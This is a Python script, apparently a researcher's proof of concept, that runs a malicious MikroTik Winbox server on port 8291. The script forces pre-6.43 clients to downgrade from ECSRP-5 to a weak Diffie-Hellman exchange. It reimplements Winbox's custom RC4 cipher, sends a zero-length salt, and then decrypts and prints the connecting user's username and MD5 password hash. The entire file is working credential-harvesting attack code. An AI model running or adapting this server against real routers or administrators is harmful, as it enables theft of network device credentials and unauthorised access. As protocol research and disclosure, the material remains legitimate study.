import random
import threading
import socket
import sys
import time

##
# This file implements the Winbox server's key exchange and encryption mechanism
# for Winbox before 6.43. The key exchange is Diffie Hellman using a 1984 bit
# non-standard prime and the encryption is a custom RC4 drop-3072 using a 124
# byte session key.
#
# This server won't respond to the initial ECSRP-5 message from the client. When
# that happens, the client will then switch to the DH implementation.
##

##
# Obj: RC4
#
# An implementation of the RC4 logic used by MikroTik's Winbox on versions
# before 6.43. This is an RC4 drop-3072 with various non-standard mixing. The
# expected key is 0x78 bytes and is half of a session key generated / exchanged
# via Diffie Hellman key exchange.
##
class RC4:
    
    # Standard RC4 drop-3072 initialization except for two things:
    # 1. the value of j, after initializing S, is carried over to future computations
    # 2. the value 'k' is introduced. While not used in the init function itself,
    #    this variable will be used to mix in previous computations in the
    #    "block crypt" function. I'm not sure if this is from some published
    #     variant of RC4 but I do wonder if it can help an attacker understand
    #     the stream state based on known plaintext? 
    def __init__(self, key):

        # init the sbox
        self.S = list(range(0x100))

        j = 0
        for i in range(0x100):
            j = (j + key[i % len(key)] + self.S[i]) & 0xff
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t

        self.i = 0
        self.j = j
        self.k = 0

        # "drop" 3072 of key stream
        for _ in range(0xc00):
            self.gen()

    # Standard RC4 generation. *Only* used by init
    def gen(self):
        i = self.i = (self.i + 1) & 255
        j = self.j = (self.j + self.S[i]) & 255
        t = self.S[i]
        self.S[i] = self.S[j]
        self.S[j] = t
        return self.S[(self.S[i] + self.S[j]) & 255]

    def send_block_crypt(self, data, padding, client = False):
        retval_data = bytearray(data)
        data_length = len(retval_data)
        counter = 0
       
        j = self.j
        while (counter < data_length):
            i = (self.i + counter + 1) & 255
            j = (j + self.k + self.S[i]) & 255 
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t
            retval_data[counter] = data[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]

            if client == True:
                self.k = retval_data[counter]
            else:
                self.k = data[counter]
            counter = counter + 1

        j = self.k + j

        for i in range(256):
            j = (j + self.S[i] & 0xff)
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t

        retval_padding = bytearray(10)
        counter = 0
        while (counter < 10):
            i = (counter + (self.i + data_length + 1)) & 255
            j = (j + self.S[i] & 0xff)
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t
            retval_padding[counter] = padding[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]
            counter = counter + 1     

        self.i = data_length + 10
        self.j = j
        if client == False:
            self.k = 0

        return retval_padding + retval_data

def downgrade_attack(sock):
    
    # Currently just listening for messages to 5 (DH) and 6 (ECSRP)
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] == 5):
        print('No need to downgrade. Received DH request.')
    elif (handler[0] == 6):
        # ignore this packet. This should trigger a DH request
        ignore = sock.recv(message_length[0])
            
        # the client should send a DH key exchange request now
        message_length = sock.recv(1)
        handler = sock.recv(1)
        if (handler[0] != 5):
            print('Client didn\'t request a DH key exchange: %x' % handler[0])
            sock.close()
            return
    else:
        print('Client didn\'t request a key exchange: %x' % handler[0])
        sock.close()
        return

    if (message_length[0] != 0xf8):
        print('[-] Client sent unexpected amount of DH public data: %x' % message_length[0])
        sock.close()
        return    

    client_public_bytes = sock.recv(message_length[0])
    client_public = int.from_bytes(client_public_bytes, byteorder='big', signed=False)
    print('[+] Received client\'s public component:')
    print('\t%x' % client_public)
    
    print('[+] Generating a secret:')
    local_secret = random.getrandbits(128)
    print('\t%x' % local_secret)

    print('[+] Computing server\'s public component: ')
    shared_prime = int("B7BA220582B41518F8526BFE0F624DE926106DFB4F719DD93BC4309D49045A4175DB1C58C4D7843D16E766226894B31793B13E789FFD2CF3331267476031B30D2F995237F0B59A33A4F972FB1A618556EF8F332E7A3C366B24FDB39B42B0670B1F90A3D2E8C22E78DDA51A16B46A8E693BB9AED29E8509361BD438E76B1C235FCDD11E70A2B8C0EA15A9DFEA03278F39C12520A0BC36F21694546154C82E065B2EFFD7DDEBD5C1E588F9916F87D80E91303C9435A20E91DD1C9360DEF6A2B0D54FDA44049C0E8CC8A8049CBB1432C6E322D603F41DAA60028C40D78A8653F659C4FFC3F5D8A4E01A5C08E4B04B52388E9EF4A5E24569D15F", 16)
    shared_base = 5
    server_public = pow(shared_base, local_secret, shared_prime)
    print('\t%x' % server_public)
    
    print('[+] Sending server\'s public component to client.')
    sock.sendall(b'\xf8' + b'\x05' + server_public.to_bytes(0xf8, byteorder='big'))

    print('[+] Computing session key:')
    shared_secret = pow(client_public, local_secret, shared_prime)
    print('\t%x' % shared_secret)
    mega_key = shared_secret.to_bytes(0xf8, byteorder='big')
    send_key = mega_key[0x7c:]
    recv_key = mega_key[:0x7c]

    print('[+] Seeding RC4 engines')
    crypto_out = RC4(send_key)
    crypto_in = RC4(recv_key)

    print('[+] Waiting for salt request')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 5):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    if (message_length[0] != 0x38):
        print('[-] Client request is an unexpected length: %x' % message_length[0])
        sock.close()
        return

    print('[+] Received salt request')
    encrypted_salt_request = sock.recv(message_length[0])
    payload = encrypted_salt_request[12:]
    padding = encrypted_salt_request[2:12]

    print('[+] Decrypting the request')
    indata = crypto_in.send_block_crypt(payload, padding, True);

    print('[+] Sending salt response')
    # Our response actually provides a 0 length salt. Which the client seems
    # to happily accept.
    padding = b'\x00'*10
    salt_response = (b'M2\x01\x00\xff\x88\x02\x00\x00\x00\x00\x00' +
        b'\x0b\x00\x00\x00\x02\x00\xff\x88\x02\x00\x0d\x00\x00\x00\x04' +
        b'\x00\x00\x00\x03\x00\xff\x09\x02\x06\x00\xff\x09\x02\x09\x00' +
        b'\x00\x31\x00')
    outdata = crypto_out.send_block_crypt(salt_response, padding);
    sock.sendall(b'\x39' + b'\x05' + b'\x00' + b'\x2d' + outdata)

    print('[+] Waiting for a login request')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 5):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    print('[+] Received a login request')
    encrypted_salt_request = sock.recv(message_length[0])
    payload = encrypted_salt_request[12:]
    padding = encrypted_salt_request[2:12]

    print('[+] Decrypting the request')
    indata = crypto_in.send_block_crypt(payload, padding, True);

    print('[+] Extracting username and hashed password:')
    
    # this logic isn't perfect since we aren't actually parsing the M2 message.
    username_offset = indata.find(b'\x01\x00\x00\x21')
    hash_offset = indata.find(b'\x0a\x00\x00\x31\x11\x00')

    username_end = username_offset + 5 + indata[username_offset + 4]
    username = indata[username_offset + 5:username_end].decode('utf-8')
    print('\t%s' % username)

    hash_end = hash_offset + 5 + 1 + 16
    md5hash = indata[hash_offset + 6:hash_end]
    print('\t', end='')
    for i in md5hash:
        print('{:02x}'.format(i), end='')
    print('')
    sock.close()
    return


if __name__ == '__main__':

    # bind to 8291 on all interfaces
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8291))
    server.listen(5)
    print('[+] Listening on 0.0.0.0:8291')

    while True:
        client_sock, address = server.accept()
        print('[+] Accepted connection from %s:%s' % (address[0], address[1]))
        client_handler = threading.Thread(target=downgrade_attack, args=(client_sock,))
        client_handler.start()

